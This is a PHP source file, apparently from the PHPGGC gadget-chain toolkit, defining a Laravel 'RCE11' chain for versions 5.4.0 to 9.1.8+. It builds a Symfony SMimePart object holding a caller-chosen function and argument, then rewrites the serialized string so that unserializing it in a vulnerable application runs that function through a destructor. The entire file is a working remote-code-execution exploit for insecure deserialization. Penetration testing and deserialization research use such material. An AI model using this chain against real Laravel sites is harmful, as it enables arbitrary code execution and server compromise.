<?php

namespace GadgetChain\Laravel;

class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '5.4.0 <= 9.1.8+';
    public static $vector = '__destruct';
    public static $author = '1nhann';


    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $param = $parameters['parameter'];

        $a = new \Symfony\Component\Mime\Part\SMimePart($function,$param);
        $ser = preg_replace("/([^\{]*\{)(.*)(s:49.*)(\})/","\\1\\3\\2\\4",serialize($a));
        $ser = str_replace("i:9999","R:2",$ser);

        return unserialize($ser);
    }
}
